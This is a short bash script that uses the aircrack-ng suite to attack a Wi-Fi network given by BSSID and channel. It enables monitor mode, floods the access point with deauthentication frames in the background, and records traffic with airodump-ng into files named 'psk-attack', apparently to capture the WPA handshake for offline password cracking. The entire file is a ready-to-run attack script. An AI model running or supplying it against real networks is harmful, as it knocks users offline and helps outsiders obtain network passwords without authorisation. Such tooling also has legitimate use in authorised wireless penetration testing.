#!/bin/bash

BSSID=$1
CHANNEL=$2
DUMP_DIRECTORY=~/airodump_traces/networks/$BSSID
PAUSE=60

deauth() {
    aireplay-ng -0 100 -a $BSSID wlan1mon
}


set -x

if [ ! -d "$DUMP_DIRECTORY" ]; then
    mkdir -p "$DUMP_DIRECTORY"
fi

airmon-ng start wlan1 $CHANNEL
deauth &
airodump-ng -w $DUMP_DIRECTORY/psk-attack --bssid $BSSID -c $CHANNEL wlan1mon
airmon-ng stop wlan1mon

